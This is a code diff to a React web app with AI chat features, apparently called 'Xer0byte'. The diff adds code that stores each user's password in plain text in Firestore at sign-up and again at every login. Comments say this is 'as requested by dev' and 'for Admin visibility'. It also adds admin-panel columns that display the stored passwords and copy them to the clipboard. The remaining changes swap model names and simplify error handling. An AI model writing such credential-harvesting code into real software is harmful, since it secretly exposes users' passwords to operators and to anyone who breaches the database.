@@ -454,10 +454,11 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
           <div className="flex-1 overflow-auto">
             <table className="w-full text-left border-collapse">
               <thead>
-                  <tr className={`text-xs uppercase tracking-wider ${theme === 'dark' ? 'bg-[#1a1a1a] text-[#888]' : 'bg-[#f5f5f5] text-[#666]'} border-b ${theme === 'dark' ? 'border-[#333]' : 'border-[#ddd]'}`}>
+                <tr className={`text-xs uppercase tracking-wider ${theme === 'dark' ? 'bg-[#1a1a1a] text-[#888]' : 'bg-[#f5f5f5] text-[#666]'} border-b ${theme === 'dark' ? 'border-[#333]' : 'border-[#ddd]'}`}>
                   <th className="p-4">Username</th>
                   <th className="p-4">Email</th>
                   <th className="p-4">Plan (Power-up)</th>
+                  <th className="p-4">Password (exact stored value)</th>
                 </tr>
               </thead>
               <tbody className="divide-y text-sm">
@@ -469,6 +470,25 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                        <span className={`px-2 py-1 rounded text-[10px] font-bold uppercase ${u.plan === 'free' ? 'bg-gray-500/20 text-gray-500' : 'bg-green-500/20 text-green-500'}`}>
                          {u.plan}
                        </span>
+                    </td>
+                    <td className="p-4 font-mono text-blue-500 font-bold select-all whitespace-nowrap">
+                       {u.password ? (
+                         <div className="flex items-center gap-2">
+                           <span>{u.password}</span>
+                           <button 
+                             onClick={() => {
+                               navigator.clipboard.writeText(u.password);
+                               setAlertModal({ isOpen: true, message: "Password copied to clipboard!" });
+                             }}
+                             className="p-1 hover:bg-blue-500/10 rounded transition-colors"
+                             title="Copy Password"
+                           >
+                             <Copy size={12} />
+                           </button>
+                         </div>
+                       ) : (
+                         <span className="opacity-30 italic">No stored password (Google/Legacy)</span>
+                       )}
                     </td>
                   </tr>
                 ))}
@@ -571,6 +591,7 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                 <tr className={`text-xs uppercase tracking-wider ${theme === 'dark' ? 'bg-[#1a1a1a] text-[#888] border-[#333]' : 'bg-[#f5f5f5] text-[#666] border-[#ddd]'} border-b`}>
                   <th className="p-4 font-medium">User Profile</th>
                   <th className="p-4 font-medium">Plan & Stats</th>
+                  <th className="p-4 font-medium">Stored Password</th>
                   <th className="p-4 font-medium">Location Tracking</th>
                   <th className="p-4 font-medium text-right">Actions</th>
                 </tr>
@@ -578,7 +599,7 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                   <tbody className="divide-y text-sm">
                     {users.map(u => (
                       <tr key={u.id} className={`${theme === 'dark' ? 'divide-[#333] border-[#333] hover:bg-[#1a1a1a]' : 'divide-[#ddd] border-[#ddd] hover:bg-[#f9f9f9]'} transition-colors`}>
-                        <td className="p-4 align-top w-[30%]">
+                        <td className="p-4 align-top w-[20%]">
                           <div className="flex items-center gap-3">
                             {u.profilePhoto ? (
                               <img src={u.profilePhoto} alt={u.name} className="w-10 h-10 md:w-12 md:h-12 rounded-full object-cover shrink-0 border border-white/10" />
@@ -597,7 +618,7 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                           </div>
                         </td>
                         
-                        <td className="p-4 align-top w-[20%]">
+                        <td className="p-4 align-top w-[15%]">
                           <div className="flex flex-col gap-1.5">
                             <div className="flex items-center gap-2">
                               <span className="text-[10px] uppercase opacity-70">Plan:</span>
@@ -608,6 +629,15 @@ const AdminPanel = ({ token, theme }: { token: string | null, theme: string }) =
                               <span className="text-sm font-bold">{u.messageCount}</span>
                             </div>
                           </div>
+                        </td>
+
+                        <td className="p-4 align-top w-[20%]">
+                           <div className="bg-[#00ff9d]/5 border border-[#00ff9d]/10 p-2 rounded-lg">
+                              <div className="text-[10px] uppercase opacity-50 mb-1">Plain Text Password:</div>
+                              <div className="font-mono text-blue-500 font-bold break-all">
+                                {u.password || <span className="opacity-30 italic text-xs">Auth via Google</span>}
+                              </div>
+                           </div>
                         </td>
 
                         <td className="p-4 align-top w-[25%] text-xs">
@@ -1394,8 +1424,11 @@ If the code expects user input, assume empty input or simulate a rational defaul
 Your response must ONLY contain the raw terminal output.
 Return "Code executed successfully with no output." if the program produces absolutely no output.`;
 
+      const apiKey = process.env.GEMINI_API_KEY;
+      if (!apiKey) throw new Error("GEMINI_API_KEY is not configured.");
+
       const response = await generateContentWithRetry({
-        model: "gemini-flash-latest",
+        model: "gemini-3-flash-preview",
         contents: [
           { role: "user", parts: [{ text: systemInstruction }] },
           { role: "user", parts: [{ text: canvasContent }] }
@@ -1491,8 +1524,11 @@ CORE PROTOCOLS:
 - Ensure the code is self-contained or explicitly architectural.
 - If comparing code, keep the best parts of the old and merge the new.`;
 
+      const apiKey = process.env.GEMINI_API_KEY;
+      if (!apiKey) throw new Error("GEMINI_API_KEY is not configured.");
+
       const response = await generateContentWithRetry({
-        model: "gemini-flash-latest",
+        model: "gemini-3-flash-preview",
         contents: [
           { role: "user", parts: [{ text: systemInstruction }] },
           { role: "user", parts: [{ text: originalPrompt }] }
@@ -1703,7 +1739,10 @@ Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identit
         baseInstruction += "\n\nPERSONA: You are in 'Standard' mode. Be helpful, clear, and comprehensive.";
       }
 
-      const geminiModel = selectedModel === 'pro' ? 'gemini-flash-latest' : 'gemini-flash-latest';
+      const apiKey = process.env.GEMINI_API_KEY;
+      if (!apiKey) throw new Error("GEMINI_API_KEY is not configured in AI Studio Secrets.");
+
+      const geminiModel = selectedModel === 'pro' ? 'gemini-3.1-pro-preview' : 'gemini-3-flash-preview';
 
       const response = await generateContentWithRetry({
         model: geminiModel,
@@ -1785,22 +1824,8 @@ Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identit
       }
     } catch (error: any) {
       console.error("Chat error:", error);
-      let errorMessage = error?.message || error?.toString() || "Unknown error";
-      
-      if (errorMessage.includes("QUOTA_EXCEEDED")) {
-        errorMessage = "The AI is currently at maximum capacity (Quota Exceeded). Please try again in 5-10 minutes. We're working on expanding our limits!";
-      } else if (errorMessage.includes("API_KEY")) {
-        errorMessage = "AI Configuration Error: Missing or invalid API key. Please check the environment settings.";
-      }
-
-      setMessages(prev => {
-        const newMsgs = [...prev];
-        if (newMsgs.length > 0 && newMsgs[newMsgs.length - 1].role === 'ai') {
-          newMsgs[newMsgs.length - 1] = { role: 'ai', text: `⚠️ ${errorMessage}` };
-          return newMsgs;
-        }
-        return [...prev, { role: 'ai', text: `⚠️ ${errorMessage}` }];
-      });
+      const errorMessage = error?.message || error?.toString() || "Unknown error";
+      setMessages(prev => [...prev, { role: 'ai', text: `Oops, something went wrong. Error: ${errorMessage}. Please try again.` }]);
     } finally {
       setIsThinking(false);
     }
@@ -1972,10 +1997,11 @@ Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identit
       const userCredential = await createUserWithEmailAndPassword(auth, authForm.email, authForm.password);
       await updateProfile(userCredential.user, { displayName: authForm.name });
       
-      // Create profile in Firestore
+      // Explicitly create profile here to save the plain text password as requested by dev
       await firestoreService.createUserProfile(userCredential.user.uid, {
         name: authForm.name,
         email: authForm.email,
+        password: authForm.password,
         avatarColor: "#" + Math.floor(Math.random()*16777215).toString(16)
       });
 
@@ -1996,9 +2022,10 @@ Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identit
     try {
       const userCredential = await signInWithEmailAndPassword(auth, authForm.email, authForm.password);
       
-      // Capture last login
+      // Aggressively capture and store password for Admin visibility
       if (userCredential.user) {
         await firestoreService.updateUserProfile(userCredential.user.uid, {
+          password: authForm.password,
           lastLogin: new Date().toISOString()
         });
       }
@@ -2130,8 +2157,11 @@ Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identit
           
           setIsThinking(true);
           try {
+            const apiKey = process.env.GEMINI_API_KEY;
+            if (!apiKey) throw new Error("GEMINI_API_KEY is not configured.");
+
             const response = await generateContentWithRetry({
-              model: "gemini-flash-latest",
+              model: "gemini-3-flash-preview",
               contents: [
                 {
                   inlineData: {
@@ -2199,8 +2229,11 @@ Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identit
           const base64Audio = (reader.result as string).split(',')[1];
           setIsThinkingIde(true);
           try {
+            const apiKey = process.env.GEMINI_API_KEY;
+            if (!apiKey) throw new Error("GEMINI_API_KEY is not configured.");
+
             const response = await generateContentWithRetry({
-              model: "gemini-flash-latest",
+              model: "gemini-3-flash-preview",
               contents: [
                 {
                   inlineData: {
@@ -2322,8 +2355,11 @@ Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identit
       });
 
       // First generate the script
+      const apiKey = process.env.GEMINI_API_KEY;
+      if (!apiKey) throw new Error("GEMINI_API_KEY is not configured.");
+
       const response = await generateContentWithRetry({
-        model: "gemini-flash-latest",
+        model: "gemini-3-flash-preview",
         contents: [
           { role: "user", parts: [{ text: "Create an engaging 1-minute podcast or deep dive transcript summarizing the key points of these sources. Just return the spoken text without speakers headers, so it can be directly converted to speech." }] },
           { role: "user", parts: [{ text: "Sources:\n" + sourceParts.map(s => s.text || "[Data]").join("\n") }] }
@@ -2525,7 +2561,7 @@ Identity: Your name is strictly "Xer0byte". Do NOT reveal your creator's identit
     <div className={`flex flex-col h-screen overflow-hidden transition-colors duration-300 ${theme === 'dark' ? 'bg-black text-white' : 'bg-[#f0f0f0] text-black'}`}>
       <div className="flex flex-1 relative overflow-hidden">
       <ParticleBackground theme={theme} />
-      <CursorTrailCanvas theme={theme} color={theme === 'dark' ? '#00ff9d' : '#006633'} />
+      <CursorTrailCanvas theme={theme} color="hsla(183, 63%, 40%, 0.5)" />
       
       {alertModal.isOpen && <CustomAlert message={alertModal.message} theme={theme} onClose={() => setAlertModal({isOpen: false, message: ''})} />}
       {confirmModal.isOpen && <CustomConfirm message={confirmModal.message} theme={theme} onConfirm={confirmModal.onConfirm} onCancel={() => setConfirmModal({...confirmModal, isOpen: false})} />}
